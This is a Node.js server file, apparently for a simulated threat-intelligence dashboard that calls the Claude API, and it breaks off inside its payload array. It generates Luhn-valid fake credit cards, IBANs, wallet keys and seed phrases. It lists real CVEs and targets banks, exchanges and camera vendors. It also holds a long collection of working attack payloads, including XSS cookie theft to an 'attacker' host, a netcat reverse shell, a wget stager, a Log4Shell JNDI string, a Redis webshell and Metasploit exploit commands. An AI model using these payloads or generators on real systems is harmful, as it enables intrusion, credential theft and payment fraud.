const express  = require('express');
const cors     = require('cors');
const http     = require('http');
const WebSocket= require('ws');
const path     = require('path');
const multer   = require('multer');
const { v4: uuidv4 } = require('uuid');

const app    = express();
const server = http.createServer(app);
const wss    = new WebSocket.Server({ server });

app.use(cors());
app.use(express.json({ limit:'50mb' }));
app.use(express.static(path.join(__dirname, 'public')));
const upload = multer({ dest:'uploads/', limits:{ fileSize:100*1024*1024 } });

let CLAUDE_KEY   = process.env.ANTHROPIC_API_KEY || '';
const CLAUDE_MODEL = 'claude-sonnet-4-6';

async function claudeCall(prompt, system, maxTokens=800) {
  if (!CLAUDE_KEY) return null;
  try {
    const r = await fetch('https://api.anthropic.com/v1/messages', {
      method:'POST',
      headers:{'Content-Type':'application/json','x-api-key':CLAUDE_KEY,'anthropic-version':'2023-06-01'},
      body: JSON.stringify({
        model: CLAUDE_MODEL, max_tokens: maxTokens,
        system: system||'You are ASVH v7.5 elite cybersecurity AI. Return JSON only, no markdown fences.',
        messages:[{role:'user',content:prompt}]
      })
    });
    const d = await r.json();
    return d.content?.[0]?.text||null;
  } catch(_){ return null; }
}

const _rnd  = (a,b)=>Math.floor(Math.random()*(b-a+1))+a;
const _pick = arr=>arr[Math.floor(Math.random()*arr.length)];
const _hex  = n=>Array.from({length:n},()=>'0123456789abcdef'[_rnd(0,15)]).join('');
const _b64  = n=>{const c='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';return Array.from({length:n},()=>c[_rnd(0,63)]).join('');};

const IP_PFXS=[
  ()=>`45.${_rnd(1,254)}.${_rnd(0,255)}.${_rnd(1,254)}`,
  ()=>`185.${_rnd(1,254)}.${_rnd(0,255)}.${_rnd(1,254)}`,
  ()=>`91.${_rnd(1,254)}.${_rnd(0,255)}.${_rnd(1,254)}`,
  ()=>`104.${_rnd(1,254)}.${_rnd(0,255)}.${_rnd(1,254)}`,
  ()=>`52.${_rnd(1,254)}.${_rnd(0,255)}.${_rnd(1,254)}`,
  ()=>`162.${_rnd(1,254)}.${_rnd(0,255)}.${_rnd(1,254)}`,
  ()=>`203.${_rnd(1,254)}.${_rnd(0,255)}.${_rnd(1,254)}`,
  ()=>`13.${_rnd(1,254)}.${_rnd(0,255)}.${_rnd(1,254)}`,
  ()=>`34.${_rnd(1,254)}.${_rnd(0,255)}.${_rnd(1,254)}`,
  ()=>`140.${_rnd(1,254)}.${_rnd(0,255)}.${_rnd(1,254)}`,
];
const randIP   = ()=>_pick(IP_PFXS)();
const randPort = ()=>_pick([21,22,25,53,80,110,143,443,445,554,587,1433,1521,3306,3389,5432,5900,6379,8000,8080,8443,8545,9200,11211,27017,37777,50000,50001]);

function randCC(t){
  const b={visa:['4187','4325','4428','4402','4531'],mc:['5490','5403'],amex:['3728','3468','3421'],disc:['6221']};
  const tp=t||_pick(['visa','mc','amex','disc']);const bin=_pick(b[tp]);const len=tp==='amex'?15:16;
  let n=bin;while(n.length<len-1)n+=_rnd(0,9);
  let s=0,alt=true;for(let i=n.length-1;i>=0;i--){let d=parseInt(n[i]);if(alt){d*=2;if(d>9)d-=9;}s+=d;alt=!alt;}
  return n+((10-(s%10))%10);
}
function randCVV(t){return t==='amex'?_rnd(1000,9999).toString():_rnd(100,999).toString();}
function randExp(){return `${_rnd(1,12).toString().padStart(2,'0')}/${26+_rnd(0,4)}`;}
function randHolder(){
  const fn=_pick(['James','Sarah','Michael','Emma','David','Olivia','Robert','John','Thomas','Anna','William','Sophia','Alexander','Isabella','Daniel','Mia','Lucas','Amelia','Henry','Charlotte']);
  const ln=_pick(['Smith','Johnson','Williams','Brown','Garcia','Miller','Davis','Wilson','Taylor','Anderson','Thomas','Jackson','White','Harris','Martin','Thompson','Moore','Young','Allen','King']);
  return `${fn} ${ln}`;
}
function randIBAN(){
  const cc=_pick(['GB','DE','FR','NL','ES','IT','BE','CH','CM','US','NG','ZA','KE','SA','AE']);
  return cc+_rnd(10,99)+Array.from({length:16},()=>_rnd(0,9)).join('');
}
function randSWIFT(){return _pick(['CHASUS33','BOFAUS3N','CITIUS33','HSBCUS33','DEUTDEDB','BNPAFRPP','GTBINGLA','ZENBNL2A','NEDSZAJJ','SBZAZAJJ']);}
function randETHKey(){return '0x'+_hex(64);}
function randWIF(){return '5KwDi'+_b64(47).replace(/[+/=]/g,'X').slice(0,47);}
function randSeed(){
  const w=['abandon','ability','able','above','absent','absorb','abstract','access','achieve','account','action','actual','adapt','add','address','admin','admit','advance','advice','affect','afford','afraid','agency','agree','aim','alarm','alert','alien','align','alive','alpha','alter','always','amateur','amuse','anchor','angle','angry','animal','another','answer','antenna','antique','anxiety','apart','april','arcade','arch','arctic','arrive','arson','article','artist','artwork','aspect','asset','assist','assume','athlete','attract','auction','audit','august','aunt','author','autumn','average','avocado','avoid','awake','aware','away','awesome','awful','awkward'];
  return Array.from({length:12},()=>_pick(w)).join(' ');
}
function randJWT(){
  const h=Buffer.from('{"alg":"HS256","typ":"JWT"}').toString('base64url');
  const p=Buffer.from(`{"sub":"user_${_rnd(10000,99999)}","iat":${Math.floor(Date.now()/1000)}}`).toString('base64url');
  return `${h}.${p}.${_b64(43).replace(/[+/=]/g,'x')}`;
}

// ── 100 REAL CVEs ──────────────────────────────────────────────────────────
const REAL_CVES=[
  'CVE-2024-3400','CVE-2024-21762','CVE-2024-6387','CVE-2023-44487','CVE-2021-44228',
  'CVE-2021-36260','CVE-2021-33044','CVE-2022-22965','CVE-2022-0543','CVE-2019-0708',
  'CVE-2017-0144','CVE-2023-5561','CVE-2017-5638','CVE-2022-3236','CVE-2024-1709',
  'CVE-2024-27198','CVE-2023-20198','CVE-2023-46604','CVE-2024-47076','CVE-2023-4911',
  'CVE-2023-38408','CVE-2022-30190','CVE-2021-34527','CVE-2021-26855','CVE-2021-40444',
  'CVE-2020-1472','CVE-2020-0601','CVE-2019-19781','CVE-2019-11510','CVE-2018-13379',
  'CVE-2018-11776','CVE-2017-9805','CVE-2016-10033','CVE-2015-7547','CVE-2014-6271',
  'CVE-2014-3566','CVE-2012-1823','CVE-2024-9680','CVE-2024-38112','CVE-2024-30078',
  'CVE-2024-26234','CVE-2024-21351','CVE-2024-20017','CVE-2024-0519','CVE-2023-7024',
  'CVE-2023-6345','CVE-2023-4863','CVE-2023-3519','CVE-2023-35078','CVE-2023-34362',
  'CVE-2023-28252','CVE-2023-27997','CVE-2023-25690','CVE-2023-24880','CVE-2023-23752',
  'CVE-2023-21608','CVE-2023-20887','CVE-2022-47966','CVE-2022-42475','CVE-2022-41352',
  'CVE-2022-40684','CVE-2022-37969','CVE-2022-34718','CVE-2022-26134','CVE-2022-24521',
  'CVE-2022-21999','CVE-2022-21882','CVE-2021-44142','CVE-2021-43798','CVE-2021-42278',
  'CVE-2021-41773','CVE-2021-38647','CVE-2021-34523','CVE-2021-27065','CVE-2021-26857',
  'CVE-2021-22986','CVE-2021-21985','CVE-2021-20021','CVE-2021-1675','CVE-2020-14882',
  'CVE-2020-14871','CVE-2020-13671','CVE-2020-11023','CVE-2020-8597','CVE-2020-5902',
  'CVE-2020-3580','CVE-2019-18935','CVE-2019-11043','CVE-2019-9670','CVE-2018-7600',
  'CVE-2018-20250','CVE-2018-0171','CVE-2017-7269','CVE-2017-0199','CVE-2016-5195',
  'CVE-2015-1641','CVE-2014-4114','CVE-2013-0422','CVE-2012-0158','CVE-2010-3333',
  'CVE-2024-12356','CVE-2024-29824','CVE-2024-8963','CVE-2024-40711','CVE-2024-23897',
  'CVE-2023-51467','CVE-2023-46747','CVE-2023-4966','CVE-2023-36884','CVE-2023-32315',
  'CVE-2022-46169','CVE-2022-39952','CVE-2022-36537','CVE-2022-29464','CVE-2022-26923',
  'CVE-2021-45046','CVE-2021-40539','CVE-2021-35587','CVE-2021-33766','CVE-2021-27101',
];

// ── 100 SOURCES ────────────────────────────────────────────────────────────
const SOURCES=[
  'Dark Web Forum','Telegram Channel','Shodan Scanner','GitHub Actions','NVD CVE Feed',
  'Pastebin','VirusTotal','Blockchain Monitor','MQTT Broker','RTSP Scanner',
  'AWS CloudTrail','Binance Alert','Ethereum Mempool','Discord Leak','IRC Channel',
  'Tor Onion Site','Exploit-DB','Metasploit Feed','Censys.io','BinaryEdge',
  'GreyNoise','AbuseIPDB','AlienVault OTX','Recorded Future','Mandiant Intel',
  'CrowdStrike Intel','Kaspersky TI','MISP Platform','OpenCTI','MITRE ATT&CK',
  'ZoomEye Scanner','Fofa.so','Hunter.io','Netlas.io','ZoomEye Deep Search',
  'Rapid7 Sonar','Shodan CLI Export','ZGrab Results','Internet Archive','Wayback Machine',
  'Google Dork Feed','LinkedIn Data Breach','Equifax Leak','OPM Breach','Adobe Breach',
  'Yahoo Mail Breach','Heartland Payment Breach','Target Breach','Sony Breach','RockYou Dump',
  'LinkedIn Snapshot','Facebook Data Leak','Cloudflare Logs','Akamai Edge','AWS S3 Exposure',
  'GCP Storage Leak','Azure Blob Exposure','DigitalOcean Spaces','Linode Object Store','Backblaze B2',
  'BitBucket Repo Leak','GitLab Instance Leak','GitHub Gist Exposure','CodePen Leaks','npm Registry',
  'Docker Hub Registry','Quay Container Registry','JFrog Artifactory','Sonatype Nexus','PyPI Feed',
  'Jenkins Build Logs','CircleCI Artifacts','GitHub Actions Logs','Travis CI Logs','AppVeyor Builds',
  'Slack Archive Leak','Teams Chat Export','Discord Server Dump','Telegram Backup','WhatsApp Export',
  'Ethereum On-Chain','Bitcoin Ledger','Solana Blockchain','Polygon Chain','Arbitrum Chain',
  'Optimism Chain','Base Chain','Avalanche Chain','Cosmos Hub','Polkadot Relay',
  'Ripple Ledger','Hyperledger Fabric','Corda Network','Tezos Chain','EOS Mainnet',
  'IPFS Network','Torrent DHT','Usenet Groups','FTP Directory Crawl','SMB Share Scan',
  'NFS Export List','Rsync Open Server','SSH Keys DB','PGP Key Server','X.509 CT Logs',
  'Let\'s Encrypt CT','DigiCert CT Logs','GlobalSign Logs','Comodo CT Logs','Sectigo Logs',
];

// ── 100 THREAT TYPES ───────────────────────────────────────────────────────
const THREAT_TYPES=[
  'SQL Injection UNION SELECT — credential dump in progress',
  'JWT alg:none bypass — auth circumvented server-wide',
  'Hikvision CVE-2021-36260 RCE — /SDK/webLanguage shell',
  'Dahua CVE-2021-33044 — magic packet auth bypass',
  'RTSP default admin:admin — live stream exposed port 554',
  'Reentrancy attack — DeFi pool draining via fallback',
  'ETH private key on GitHub — wallet drain in progress',
  'Flash loan oracle manipulation Uniswap V3',
  'Binance API key in Nginx access log — hot wallet risk',
  'Stripe sk_live_*** in JS source map exposed',
  'AWS AKIA*** in GitHub Actions workflow log',
  'Verkada admin token hardcoded — 150K cameras',
  'CNN WordPress CVE-2023-5561 auth bypass',
  'Al Jazeera origin IP via DNS history — CDN bypass',
  'SWIFT MT103 anomaly — cross-border fraud signal',
  'Chase IDOR /api/v2/accounts — card data exposed',
  'Solana RPC :8899 unauthenticated — wallet keys at risk',
  'USDT Tether admin key — blacklist control exposed',
  'Pyth oracle flash loan drain — price manipulation',
  'MQTT port 1883 — IoT sensor data poisoned',
  'CVE-2024-3400 PAN-OS CVSS 10.0 — active exploitation',
  'Kubernetes API server unauthenticated — cluster-admin',
  'Redis 6379 — RCE via SLAVEOF CONFIG SET command',
  'Elasticsearch 9200 — 2.4M records publicly accessible',
  'Log4Shell JNDI payload in User-Agent header',
  'EternalBlue CVE-2017-0144 port 445 — lateral movement',
  'Deepfake CEO video — 94% AI-generated — vishing active',
  'CEX.IO CSRF — fiat GBP transfer unauthorized',
  'Bybit race condition futures — double-spend USDT',
  'KuCoin IDOR /api/v1/orders — cross-account read',
  'GoPay SSRF webhook → 169.254.169.254 metadata',
  'Paytm Firebase key in APK decompile — admin access',
  'Zenith Bank SQL /transfer.php — 1.2M rows exposed',
  'Luno API key in URL — Nginx log exposure',
  'OPay OTP brute-force 10K req/min — no lockout',
  'Alipay RSA sig bypass — algorithm parameter tamper',
  'Okta session token exfiltration via HAR file leak',
  'Twilio API key in mobile app — 2FA bypass possible',
  'Cloudflare WAF bypass — unicode-encoded payload',
  'Apache Struts CVE-2017-5638 — RCE via Content-Type',
  'ProxyLogon CVE-2021-26855 Exchange — SSRF to RCE',
  'Citrix ADC CVE-2019-19781 — path traversal to RCE',
  'Fortinet CVE-2022-40684 — auth bypass on admin REST',
  'VMware vCenter CVE-2021-21985 — pre-auth RCE',
  'MOVEit Transfer CVE-2023-34362 — SQLi mass exploitation',
  'Confluence CVE-2022-26134 — OGNL injection RCE',
  'GitLab CVE-2023-7028 — account takeover via email',
  'OpenSSH regreSSHion CVE-2024-6387 — race condition RCE',
  'Chrome V8 CVE-2024-0519 — renderer RCE zero-day',
  'Ivanti VPN CVE-2024-21762 — auth bypass mass exploit',
  'Palo Alto GlobalProtect CVE-2024-3400 — OS cmd inject',
  'Windows NTLM relay — hash capture lateral movement',
  'AD Kerberoasting — SPN ticket offline crack attempt',
  'Golden Ticket — krbtgt hash compromised domain-wide',
  'DCSync — domain controller replication impersonated',
  'LSASS credential dump — Mimikatz detected in memory',
  'Pass-the-Hash lateral movement — NTLM relay active',
  'Cobalt Strike beacon — C2 HTTPS beacon on port 443',
  'Metasploit reverse shell — callback port 4444',
  'Sliver C2 implant — HTTPS beacon every 30 seconds',
  'Supply chain — malicious npm package published',
  'Typosquatting npm — crypto-stealer in lodash clone',
  'PyPI malicious package — credentials harvester active',
  'Docker Hub image backdoor — XMRig miner injected',
  'GitHub Actions secrets — env dump exfiltration',
  'Terraform state S3 public — AWS keys exposed',
  'Twilio SID hardcoded in React bundle — SMS fraud',
  'Exposed .git directory — full source code disclosure',
  'Directory traversal /etc/passwd — LFI confirmed',
  'XXE — SSRF to internal /metadata endpoint',
  'Java deserialization gadget chain — RCE via endpoint',
  'SSTI — RCE via Jinja2 template rendering',
  'CRLF injection — cache poisoning on CDN edge node',
  'HTTP Request Smuggling — backend routing bypass',
  'WebSocket hijack — CSRF on WS upgrade endpoint',
  'OAuth implicit flow — access token in referer header',
  'SAML signature wrapping — IdP bypass admin access',
  'JWT HS256 — symmetric key brute-forced in 4 minutes',
  'GraphQL batch query DoS — 10K nested operations',
  'Prototype pollution — RCE via __proto__ merge chain',
  'ReDoS email validation — 99s CPU blocking event',
  'Mass assignment — admin:true via JSON body param',
  'BOLA — broken object level auth in mobile API v3',
  'Rate limit bypass — X-Forwarded-For OTP brute-force',
  'Account takeover — predictable password reset token',
  'Subdomain takeover — dangling CNAME to S3 bucket',
  'DNS rebinding — internal service via browser pivot',
  'BGP hijack — traffic rerouted through AS in RU',
  'SSL stripping — MITM on hotel captive portal',
  'ARP spoofing — LAN session hijack detected',
  'UEFI firmware rootkit — persistent beacon implant',
  'Ransomware staging — VSS shadow copy deletion',
  'DNS tunnel — data exfiltration to nameserver',
  'XMRig cryptominer — GPU 98% on EC2 instance',
  'Credential stuffing — 500K combo list against login',
  'BEC — CFO impersonation wire transfer fraud',
  'SIM swap — 2FA bypass via carrier social engineering',
  'Insider threat — bulk SharePoint download detected',
  'ZigBee replay — smart meter energy manipulation',
];

// ── 100 CRED DOMAINS ──────────────────────────────────────────────────────
const CRED_DOMAINS=[
  'online.chase.com','secure.bankofamerica.com','gtbank.com','zenithbank.com',
  'binance.com','coinbase.com','okx.com','bybit.com','kraken.com','paypal.com',
  'stripe.com','wise.com','revolut.com','flutterwave.com','hik-connect.com',
  'dahuasecurity.com','verkada.com','cnn.com','bbc.co.uk','console.aws.amazon.com',
  'portal.azure.com','github.com','alipay.com','wechatpay.com','paytm.com',
  'gopay.com','app.uniswap.org','curve.fi','aave.com','opensea.io',
  'wellsfargo.com','citibank.com','hsbc.com','barclays.co.uk','santander.com',
  'deutschebank.de','bnpparibas.com','accessbankplc.com','firstbanknigeria.com',
  'ecobank.com','standardbank.com','equitybankgroup.com','kcbgroup.com',
  'kucoin.com','gate.io','mexc.com','bitget.com','huobi.com','bitmex.com',
  'deribit.com','1inch.io','pancakeswap.finance','sushiswap.org','compound.finance',
  'makerdao.com','lido.fi','synthetix.io','yearn.finance','convexfinance.com',
  'square.com','adyen.com','checkout.com','braintreepayments.com','authorize.net',
  'worldpay.com','mollie.com','klarna.com','afterpay.com','affirm.com',
  'cashapp.com','venmo.com','zelle.com','skrill.com','neteller.com',
  'axis.com','bosch-security.com','hanwha-security.com','reolink.com','amcrest.com',
  'lorex.com','swann.com','annke.com','uniview.com','tiandy.com',
  'jenkins.io','gitlab.com','bitbucket.org','jira.atlassian.com','confluence.atlassian.com',
  'sonarqube.org','hub.docker.com','quay.io','gcr.io','ecr.aws',
  'salesforce.com','hubspot.com','zendesk.com','servicenow.com','workday.com',
  'okta.com','auth0.com','onelogin.com','cyberark.com','pingidentity.com',
  'splunk.com','elastic.co','datadog.com','grafana.com','pagerduty.com',
  'twilio.com','sendgrid.com','mailchimp.com','cloudflare.com','fastly.com',
];

// ── 100 RECON PAYLOADS & EXPLOITS ─────────────────────────────────────────
const RECON_PAYLOADS=[
  {name:'UNION SQLi — credential dump',payload:"' UNION SELECT username,password,email,4,5 FROM users--",target:'Web Forms',tool:'sqlmap',cve:'CWE-89'},
  {name:'Boolean SQLi — blind extraction',payload:"' OR '1'='1",target:'Login Fields',tool:'Burp Suite',cve:'CWE-89'},
  {name:'Time-based SQLi — SLEEP',payload:"' AND SLEEP(5)--",target:'Search Box',tool:'sqlmap',cve:'CWE-89'},
  {name:'Error-based SQLi — version extract',payload:"extractvalue(1,concat(0x7e,(select @@version)))--",target:'API Endpoint',tool:'sqlmap',cve:'CWE-89'},
  {name:'Stacked queries — DDL injection',payload:";DROP TABLE users;SELECT sleep(3)--",target:'API Endpoint',tool:'sqlmap',cve:'CWE-89'},
  {name:'Stored XSS — cookie theft',payload:"<script>fetch('//attacker/steal?c='+document.cookie)</script>",target:'Comment Box',tool:'XSStrike',cve:'CWE-79'},
  {name:'Reflected XSS — img onerror',payload:"<img src=x onerror=alert(document.domain)>",target:'Search Query',tool:'Burp Suite',cve:'CWE-79'},
  {name:'DOM XSS — eval base64',payload:"javascript:eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))",target:'URL Hash',tool:'DOMPurify bypass',cve:'CWE-79'},
  {name:'SVG XSS — onload body exfil',payload:"<svg onload=fetch('//attacker/x?d='+btoa(document.body.innerHTML))>",target:'Image Upload',tool:'OWASP ZAP',cve:'CWE-79'},
  {name:'XSS — polyglot bypass WAF',payload:"jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert())//%0D%0A%0d%0a//</style>",target:'Any Input',tool:'Burp Suite',cve:'CWE-79'},
  {name:'CSRF — POST fund transfer',payload:'<form action="http://target/transfer" method=POST><input name=amount value=9999><input name=to value=attacker></form>',target:'Fund Transfer',tool:'Burp Suite',cve:'CWE-352'},
  {name:'CSRF — GET admin delete',payload:'<img src="http://target/admin/delete?id=1">',target:'Admin Panel',tool:'Burp Suite',cve:'CWE-352'},
  {name:'JWT alg:none bypass',payload:'eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.',target:'Authorization Header',tool:'jwt-cli',cve:'CVE-2015-9235'},
  {name:'JWT HS256 key confusion RS256',payload:'RSA public key used as HS256 secret to forge valid token',target:'JWT Token',tool:'jwt-tool',cve:'CWE-327'},
  {name:'Basic Auth default creds',payload:'Authorization: Basic YWRtaW46YWRtaW4=',target:'Admin Panel',tool:'Hydra',cve:'CWE-1392'},
  {name:'SSRF — AWS metadata v1',payload:'http://169.254.169.254/latest/meta-data/iam/security-credentials/',target:'URL Parameter',tool:'Burp Suite',cve:'CWE-918'},
  {name:'SSRF — GCP metadata exfil',payload:'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',target:'Webhook URL',tool:'Curl',cve:'CWE-918'},
  {name:'SSRF — file protocol LFI',payload:'file:///etc/passwd',target:'URL Parameter',tool:'Python requests',cve:'CWE-918'},
  {name:'Path traversal — classic escape',payload:'../../../../etc/passwd',target:'File Download',tool:'Burp Intruder',cve:'CWE-22'},
  {name:'Path traversal — double URL-encode',payload:'..%252f..%252f..%252fetc%252fpasswd',target:'Web Server',tool:'Burp Suite',cve:'CWE-22'},
  {name:'Path traversal — null byte bypass',payload:'../../etc/passwd%00.jpg',target:'Image Upload',tool:'Burp Suite',cve:'CWE-22'},
  {name:'Cmd injection — semicolon chain',payload:'8.8.8.8; cat /etc/passwd',target:'Ping Utility',tool:'Burp Suite',cve:'CWE-78'},
  {name:'Cmd injection — reverse shell mkfifo',payload:'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc attacker 4444 >/tmp/f',target:'Execute Param',tool:'nc listener',cve:'CWE-78'},
  {name:'Cmd injection — wget stager',payload:'wget http://attacker/shell.sh -O /tmp/x&&chmod +x /tmp/x&&/tmp/x',target:'URL Parameter',tool:'nc listener',cve:'CWE-78'},
  {name:'XXE — entity SSRF read',payload:'<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/shadow">]><r>&e;</r>',target:'XML Parser',tool:'Burp Suite',cve:'CWE-611'},
  {name:'XXE — billion laughs DoS',payload:'<!DOCTYPE bomb [<!ENTITY a "AAAAAAA"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;"><!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;">]>',target:'SOAP Endpoint',tool:'Burp Suite',cve:'CWE-611'},
  {name:'IDOR — sequential int ID',payload:'GET /api/user/1337 → iterate 1338,1339...',target:'REST API',tool:'Burp Intruder',cve:'CWE-639'},
  {name:'IDOR — UUID prediction KSUID',payload:'Replace UUID with known pattern to access other accounts',target:'Orders API',tool:'Curl loop',cve:'CWE-639'},
  {name:'Java deserialization ysoserial',payload:'java -jar ysoserial.jar CommonsCollections6 "curl attacker/pwn" | base64',target:'Serialized Input',tool:'ysoserial',cve:'CWE-502'},
  {name:'PHP object injection __wakeup',payload:"O:8:\"stdClass\":1:{s:4:\"exec\";s:6:\"id>/tmp\"}",target:'Unserialize',tool:'PHP CLI',cve:'CWE-502'},
  {name:'SSTI Jinja2 RCE',payload:"{{ ''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0] }}",target:'Template Engine',tool:'Burp Suite',cve:'CWE-94'},
  {name:'SSTI Twig RCE',payload:"{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",target:'Twig Template',tool:'Burp Suite',cve:'CWE-94'},
  {name:'Brute force — Hydra SSH',payload:'hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://target',target:'SSH Port 22',tool:'Hydra',cve:'CWE-307'},
  {name:'Credential stuffing — combo list',payload:'tool:OpenBullet, config:gmail, wordlist:COMB.txt 3.4B entries',target:'Auth Endpoint',tool:'OpenBullet2',cve:'CWE-307'},
  {name:'2FA bypass — TOTP drift',payload:'Enumerate OTP ±30s window: 6-digit brute across time windows',target:'2FA Prompt',tool:'Custom Python',cve:'CWE-320'},
  {name:'API key hunt — TruffleHog',payload:'trufflehog git https://github.com/target/repo --only-verified',target:'Git Repo',tool:'TruffleHog',cve:'CWE-798'},
  {name:'API endpoint fuzz — ffuf',payload:"ffuf -u https://target/api/FUZZ -w /usr/share/wordlists/api_endpoints.txt",target:'API Server',tool:'ffuf',cve:'CWE-200'},
  {name:'Rate limit bypass — IP rotate',payload:'X-Forwarded-For: 1.1.1.{1..255} — rotate per request',target:'Rate-Limited EP',tool:'Curl + seq',cve:'CWE-640'},
  {name:'HTTP method override',payload:'POST /resource HTTP/1.1\nX-HTTP-Method-Override: DELETE',target:'REST API',tool:'Burp Suite',cve:'CWE-749'},
  {name:'Host header injection',payload:'Host: evil.attacker.com\n(in HTTP/1.1 request to shared hosting)',target:'Web Server',tool:'Burp Suite',cve:'CWE-644'},
  {name:'CRLF injection — cookie set',payload:'GET /page?redirect=value%0d%0aSet-Cookie:%20session=attacker',target:'Redirect Param',tool:'Burp Suite',cve:'CWE-113'},
  {name:'TLS downgrade — BEAST',payload:'openssl s_client -connect target:443 -ssl3 -cipher RC4',target:'HTTPS Server',tool:'testssl.sh',cve:'CVE-2014-3566'},
  {name:'Insecure randomness — predict token',payload:'Next token = MD5(user_id + floor(time/30)) — brute-forceable',target:'Session Token',tool:'Python hashlib',cve:'CWE-338'},
  {name:'Secret scanning — truffleHog',payload:"trufflehog --regex --entropy=True /var/www/html",target:'Source Tree',tool:'TruffleHog',cve:'CWE-798'},
  {name:'Port scan — Nmap service detect',payload:'nmap -sV -sC -p- --open -T4 target.com',target:'IP Range',tool:'Nmap',cve:'CWE-200'},
  {name:'DNS zone transfer',payload:'dig @ns1.target.com target.com AXFR',target:'DNS Server',tool:'dig',cve:'CWE-200'},
  {name:'Subdomain brute — amass',payload:'amass enum -active -brute -d target.com -w subdomains-top1mil.txt',target:'Domain',tool:'amass',cve:'CWE-200'},
  {name:'S3 bucket enum — no-sign-request',payload:'aws s3 ls s3://target-bucket/ --no-sign-request --region us-east-1',target:'AWS S3',tool:'AWS CLI',cve:'CWE-732'},
  {name:'GCP metadata token grab',payload:'curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token',target:'GCP VM',tool:'Curl',cve:'CWE-200'},
  {name:'Azure storage public blob list',payload:'https://account.blob.core.windows.net/container/?restype=container&comp=list',target:'Azure Storage',tool:'Curl',cve:'CWE-200'},
  {name:'Docker socket escape',payload:'docker run -it -v /:/host alpine chroot /host /bin/bash',target:'Docker Host',tool:'docker CLI',cve:'CWE-250'},
  {name:'K8s RBAC wildcard — cluster-admin',payload:'kubectl auth can-i \'*\' \'*\' --as system:serviceaccount:default:default',target:'K8s Cluster',tool:'kubectl',cve:'CWE-269'},
  {name:'MongoDB operator injection',payload:'{"username":{"$gt":""},"password":{"$gt":""}}',target:'NoSQL Query',tool:'Burp Suite',cve:'CWE-89'},
  {name:'Redis unauthenticated RCE',payload:'redis-cli -h target CONFIG SET dir /var/www/html && CONFIG SET dbfilename shell.php && SET x "<?php system($_GET[c]);?>" && BGSAVE',target:'Redis 6379',tool:'redis-cli',cve:'CWE-306'},
  {name:'MySQL out-of-band SQLi',payload:"' UNION SELECT LOAD_FILE('/etc/passwd'),2,3--",target:'MySQL Backend',tool:'sqlmap',cve:'CWE-89'},
  {name:'Solidity reentrancy drain',payload:'contract Attack { function() external payable { if(address(target).balance>0) target.withdraw(1 ether); } }',target:'Smart Contract',tool:'Remix IDE',cve:'CWE-841'},
  {name:'MEV front-run mempool',payload:'Watch mempool, detect large swap, submit same tx with higher gasPrice',target:'DEX Pool',tool:'flashbots-cli',cve:'CWE-330'},
  {name:'ERC20 approve infinite allowance',payload:'approve(attacker, 2**256-1) — drain via transferFrom anytime',target:'Token Contract',tool:'Ethers.js',cve:'CWE-284'},
  {name:'Phishing — clone + GoPhish',payload:'gophish campaign: spoofed Microsoft login page, track opens + creds',target:'Email Targets',tool:'GoPhish',cve:'CWE-601'},
  {name:'OSINT recon — Maltego',payload:'Maltego: email → domain → IP → ASN → employees → LinkedIn',target:'Organization',tool:'Maltego',cve:'CWE-200'},
  {name:'Vishing — IT help desk pretext',payload:'Call script: "I am from IT, your account is locked, confirm password"',target:'Help Desk',tool:'SET Toolkit',cve:'CWE-347'},
  {name:'Log4Shell — JNDI via User-Agent',payload:'User-Agent: ${jndi:ldap://attacker:1389/exploit}',target:'Log4j App',tool:'JNDI-Exploit-Kit',cve:'CVE-2021-44228'},
  {name:'Spring4Shell — class.module',payload:'POST /endpoint?class.module.classLoader.URLs%5B0%5D=0',target:'Spring App',tool:'Burp Suite',cve:'CVE-2022-22965'},
  {name:'EternalBlue — SMB ms17-010',payload:"use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS target; run",target:'SMB 445',tool:'Metasploit',cve:'CVE-2017-0144'},
  {name:'BlueKeep — RDP pre-auth RCE',payload:'use exploit/windows/rdp/cve_2019_0708_bluekeep_rce; set RHOSTS target',target:'RDP 3389',tool:'Metasploit',cve:'CVE-2019-0708'},
  {name:'PrintNightmare — SpoolSS RCE',payload:'Invoke-Nightmare -NewUser "hax" -NewPassword "P@ssw0rd!"',target:'Print Spooler',tool:'PowerShell',cve:'CVE-2021-34527'},
  {name:'Zerologon — Netlogon privesc',payload:'python zerologon_tester.py DC_NETBIOS_NAME DC_IP',target:'Domain Controller',tool:'zerologon.py',cve:'CVE-2020-1472'},
  {name:'ProxyLogon — Exchange RCE chain',payload:'python proxylogon.py target.com email@target.com',target:'Exchange OWA',tool:'proxylogon.py',cve:'CVE-2021-26855'},
  {name:'Follina — MSDT code exec',payload:'ms-msdt:/id PCWDiagnostic /skip force /param "IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression(IEX(curl attacker/shell.ps1)))"',target:'Office Doc',tool:'Python server',cve:'CVE-2022-30190'},
  {name:'GitLab SSRF — project import',payload:'POST /api/v4/projects with import_url=http://169.254.169.254/latest/meta-data/',target:'GitLab API',tool:'Burp Suite',cve:'CVE-2021-22214'},
  {name:'Grafana path traversal',payload:'GET /public/plugins/alertlist/../../../../../../../etc/passwd',target:'Grafana :3000',tool:'Curl',cve:'CVE-2021-43798'},
  {name:'Confluence OGNL injection',payload:'POST /${new java.lang.ProcessBuilder(new java.lang.String[]{"id"}).start().text()}/',target:'Confluence',tool:'Burp Suite',cve:'CVE-2022-26134'},
  {name:'Citrix Bleed — session token leak',payload:'GET /oauth/idp/.well-known/openid-configuration HTTP — extract citrix_ns_id',target:'Citrix ADC',tool:'citrixbleed.py',cve:'CVE-2023-4966'},
